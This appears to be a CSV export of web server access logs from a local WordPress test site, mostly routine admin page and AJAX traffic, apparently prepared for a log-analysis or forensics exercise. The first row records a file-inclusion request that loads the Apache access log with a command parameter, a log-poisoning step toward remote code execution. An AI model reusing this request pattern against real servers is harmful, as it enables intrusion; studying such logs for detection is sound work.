timestamp,sourceIP,HTTP_method,page,referrer,response_code,response_size,user-agent
25/Oct/2022:15:36:33,172.18.1.1,GET,/search.php?file=/var/log/apache2/access.log&c=id,"""-""",200,3873,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:36:14,172.18.1.1,GET,/,"""-""",200,11169,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:36:15,172.18.1.1,GET,/wp-includes/css/admin-bar.min.css?ver=6.0.3,"""http://localhost:8080/""",200,4163,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:16:02,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:14:01,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:13:01,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:11:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:09:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:08:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:06:52,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:04:52,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:02:54,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:15:00:53,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:58:52,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:57:51,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:49:28,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:47:27,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:45:26,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:43:25,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:41:24,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:39:23,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:38:22,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:36:21,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:35:23,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:35:21,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:34:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:06,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:33:01,172.18.1.1,POST,/wp-admin/post.php,"""http://localhost:8080/wp-admin/""",200,1078,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:39,172.18.1.1,GET,/wp-admin/images/spinner.gif,"""http://localhost:8080/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0.3""",200,3942,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,573,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,6906,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/postbox.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/vendor/moment.min.js?ver=2.29.4,"""http://localhost:8080/wp-admin/""",200,18869,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/dashboard.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,3406,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105,"""http://localhost:8080/wp-admin/""",200,4345,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/date.min.js?ver=e923a564a0407e0c2ffcbd348817ca86,"""http://localhost:8080/wp-admin/""",200,33285,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/plugin-install.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1364,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wp-sanitize.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,626,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/updates.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,9413,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/media-upload.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,954,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/svg-painter.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2469,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/shortcode.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1487,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wp-auth-check.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1115,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/heartbeat.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2368,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wplink.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,4226,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,3368,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,3238,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,GET,/wp-includes/js/thickbox/loadingAnimation.gif,"""http://localhost:8080/wp-admin/""",200,15525,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/admin-ajax.php?action=wp-compression-test&test=1&_ajax_nonce=ae20010ade&1666708327987,"""http://localhost:8080/wp-admin/""",200,1066,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,GET,/wp-admin/admin-ajax.php?action=wp-compression-test&test=no&_ajax_nonce=ae20010ade&1666708328075,"""http://localhost:8080/wp-admin/""",200,444,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,GET,/wp-admin/admin-ajax.php?action=dashboard-widgets&widget=dashboard_primary&pagenow=dashboard,"""http://localhost:8080/wp-admin/""",200,595,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:47,172.18.1.1,GET,/wp-admin/,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,18037,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/thickbox/thickbox.css?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1275,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,"/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,100689,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,"/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,35286,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/css/editor.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,6228,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/common.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,6868,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/hoverintent-js.min.js?ver=2.2.1,"""http://localhost:8080/wp-admin/""",200,1060,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/admin-bar.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1738,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/clipboard.min.js?ver=2.0.10,"""http://localhost:8080/wp-admin/""",200,3446,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/a11y.min.js?ver=a38319d7ba46c6e60f7f9d4c371222c5,"""http://localhost:8080/wp-admin/""",200,1331,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/dom-ready.min.js?ver=d996b53411d1533a84951212ab6ac4ff,"""http://localhost:8080/wp-admin/""",200,673,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/vendor/lodash.min.js?ver=4.17.19,"""http://localhost:8080/wp-admin/""",200,25273,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,"/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=hoverIntent,regenerator-runtime,wp-polyfill,wp-hooks&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,11673,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/api-request.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,932,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/url.min.js?ver=16385e4d69da65c7283790971de6b297,"""http://localhost:8080/wp-admin/""",200,2337,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/site-health.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2484,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/jquery.color.min.js?ver=2.2.0,"""http://localhost:8080/wp-admin/""",200,3248,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wp-ajax-response.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1406,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wp-lists.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2874,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/quicktags.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,3854,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/edit-comments.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,5451,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/jquery.query.js?ver=2.2.3,"""http://localhost:8080/wp-admin/""",200,1970,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
